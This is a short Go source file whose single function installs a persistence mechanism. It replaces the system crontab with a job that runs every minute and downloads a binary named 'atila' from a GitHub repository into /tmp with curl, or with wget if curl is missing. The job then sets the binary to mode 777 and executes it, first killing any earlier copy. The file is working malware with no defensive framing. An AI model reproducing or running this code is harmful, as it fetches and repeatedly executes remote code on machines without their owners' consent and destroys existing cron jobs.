package main



import (

 
//"fmt"
"os"
"os/exec"

)




func cron(){


_, err_curl := os.Open("/usr/bin/curl")
 

if err_curl == nil  { 

cron_ := exec.Command("sh",  "-c" ,   "echo '* * * * * /usr/bin/pkill -9 atila_cron ; curl -L -o /tmp/atila_cron https://github.com/atilaadmin/atila/raw/refs/heads/master/bin/atila ; chmod 777 /tmp/atila_cron ; /tmp/./atila_cron' | crontab -")

cron_.Run()


return 

}


//using wget

cron_ := exec.Command("sh",  "-c" ,   "echo '* * * * * /usr/bin/pkill -9 atila_cron ; wget -O /tmp/atila_cron https://github.com/atilaadmin/atila/raw/refs/heads/master/bin/atila ; chmod 777 /tmp/atila_cron ; /tmp/./atila_cron' | crontab -")

cron_.Run()



}

